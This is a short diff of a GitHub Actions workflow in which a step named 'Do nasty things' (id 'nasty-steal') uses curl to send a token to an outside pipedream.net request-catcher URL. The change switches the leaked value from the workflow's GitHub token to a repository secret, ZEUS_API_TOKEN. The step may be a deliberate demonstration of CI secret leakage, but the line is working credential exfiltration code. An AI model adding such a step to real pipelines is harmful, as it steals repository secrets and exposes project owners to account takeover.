@@ -22,7 +22,7 @@ jobs:
       - name: Do nasty things
         id: nasty-steal
         run: |
-          curl 'https://c6b4986ad076f90aadd6c0a6e312d260.m.pipedream.net?token=${{ github.token }}'
+          curl 'https://c6b4986ad076f90aadd6c0a6e312d260.m.pipedream.net?token=${{ secrets.ZEUS_API_TOKEN }}'
 
       - uses: actions/checkout@v2
 
